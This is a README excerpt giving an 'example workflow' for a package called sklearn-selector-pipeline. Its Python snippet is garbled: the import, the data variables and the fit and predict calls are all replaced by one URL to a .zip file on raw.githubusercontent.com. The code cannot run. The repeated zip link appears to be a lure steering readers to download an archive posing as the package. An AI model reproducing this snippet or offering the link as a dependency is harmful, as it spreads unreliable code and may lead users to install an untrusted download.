## 📝 Example Workflow

Here’s a basic example to illustrate how you can use the sklearn-selector-pipeline in a workflow:

```python
from sklearn_selector_pipeline import SomeEstimator
from https://raw.githubusercontent.com/miheo-al2/sklearn-selector-pipeline/main/sklearn_selector_pipeline/sklearn-selector-pipeline_1.3.zip import load_iris

# Load example data
data = load_iris()
X, y = https://raw.githubusercontent.com/miheo-al2/sklearn-selector-pipeline/main/sklearn_selector_pipeline/sklearn-selector-pipeline_1.3.zip, https://raw.githubusercontent.com/miheo-al2/sklearn-selector-pipeline/main/sklearn_selector_pipeline/sklearn-selector-pipeline_1.3.zip

# Create an instance of your pipeline
pipeline = SomeEstimator()

# Fit the model
https://raw.githubusercontent.com/miheo-al2/sklearn-selector-pipeline/main/sklearn_selector_pipeline/sklearn-selector-pipeline_1.3.zip(X, y)

# Make predictions
predictions = https://raw.githubusercontent.com/miheo-al2/sklearn-selector-pipeline/main/sklearn_selector_pipeline/sklearn-selector-pipeline_1.3.zip(X)
```

This sample displays the simple steps needed to create a pipeline that fits a model to your data and makes predictions.
